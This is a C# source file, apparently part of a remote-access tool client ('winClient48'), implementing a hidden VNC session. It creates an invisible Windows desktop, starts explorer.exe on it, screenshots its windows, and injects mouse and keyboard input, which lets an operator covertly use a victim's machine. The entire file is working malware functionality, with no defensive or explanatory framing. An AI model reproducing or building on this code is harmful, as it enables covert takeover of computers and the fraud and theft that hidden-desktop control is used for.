using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;

namespace winClient48
{
    public class clsfnHvncSession
    {
        private IntPtr m_hDesktop { get; set; }
        private string m_szDesktopName { get; set; }
        private IntPtr m_hLastWnd { get; set; }
        private const uint GENERIC_ALL = 0x10000000;

        public clsfnHvncSession(string szDesktopName)
        {
            m_szDesktopName = szDesktopName;
            m_hDesktop = WinAPI.CreateDesktop(szDesktopName, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
        }

        public void fnStartExplorer()
        {
            WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            //si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
            //si.wShowWindow = 3;      // SW_MAXIMIZE
            si.lpDesktop = m_szDesktopName; // Specify explorer for running in hidden desktop

            WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();

            //new StringBuilder("explorer.exe /separate")
            WinAPI.CreateProcess(
                null, 
                new StringBuilder("explorer.exe /separate"), 
                IntPtr.Zero, 
                IntPtr.Zero, 
                false, 
                0, 
                IntPtr.Zero, 
                null, 
                ref si, 
                out pi
            );
        }

        public Bitmap fnGetScreenshot(int nWidth, int nHeight)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);
            Bitmap bmp = new Bitmap(nWidth, nHeight, PixelFormat.Format32bppPArgb);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.Clear(Color.FromArgb(45, 45, 45));
                IntPtr hdc = g.GetHdc();

                WinAPI.EnumDesktopWindows(m_hDesktop, (hWnd, lParam) =>
                {
                    if (WinAPI.IsWindowVisible(hWnd))
                    {
                        // PW_RENDERFULLCONTENT = 0x00000002
                        WinAPI.PrintWindow(hWnd, hdc, 2);
                    }
                    return true;
                }, IntPtr.Zero);

                g.ReleaseHdc(hdc);
            }

            return bmp;
        }

        public void fnHandleMouseInput(string type, int x, int y, int vk = 0)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);

            Point p = new Point(x, y);
            
            IntPtr hWnd = WinAPI.WindowFromPoint(p);
            IntPtr hChild = WinAPI.ChildWindowFromPoint(hWnd, p);
            if (IntPtr.Zero != hChild && hChild != hWnd)
                hWnd = hChild;

            m_hLastWnd = hWnd;

            WinAPI.ScreenToClient(hWnd, ref p);

            IntPtr lParam = (IntPtr)((p.Y << 16) | (p.X & 0xFFFF));
            switch (type)
            {
                case "move":
                    WinAPI.PostMessage(hWnd, 0x0200, IntPtr.Zero, lParam); // WM_MOUSEMOVE
                    break;

                case "LD":
                    WinAPI.SetForegroundWindow(hWnd);
                    WinAPI.SetFocus(hWnd);
                    WinAPI.PostMessage(hWnd, 0x0201, (IntPtr)1, lParam);   // WM_LBUTTONDOWN
                    break;
                case "LU":
                    WinAPI.PostMessage(hWnd, 0x0202, IntPtr.Zero, lParam); // WM_LBUTTONUP
                    break;

                case "RD":
                    WinAPI.PostMessage(hWnd, 0x0204, (IntPtr)2, lParam);   // WM_RBUTTONDOWN
                    break;
                case "RU":
                    WinAPI.PostMessage(hWnd, 0x0205, IntPtr.Zero, lParam); // WM_RBUTTONUP
                    WinAPI.PostMessage(hWnd, 0x007B, hWnd, lParam);
                    break;

                case "MD":
                    WinAPI.PostMessage(hWnd, 0x0207, (IntPtr)16, lParam);  // WM_MBUTTONDOWN
                    break;
                case "MU":
                    WinAPI.PostMessage(hWnd, 0x0208, IntPtr.Zero, lParam); // WM_MBUTTONUP
                    break;
            }
        }

        public void fnHandleKeyboardInput(string action, int vk)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);

            IntPtr hWnd = (m_hLastWnd != IntPtr.Zero) ? m_hLastWnd : WinAPI.GetForegroundWindow();

            if (hWnd != IntPtr.Zero)
            {
                uint msg = (action == "down") ? (uint)0x0100 : (uint)0x0101;

                WinAPI.PostMessage(hWnd, msg, (IntPtr)vk, IntPtr.Zero);

                if (action == "down" && ((vk >= 65 && vk <= 90) || (vk >= 48 && vk <= 57) || vk == 32 || vk == 13))
                {
                    WinAPI.PostMessage(hWnd, 0x0102, (IntPtr)vk, IntPtr.Zero);
                }
            }
        }
    }
}
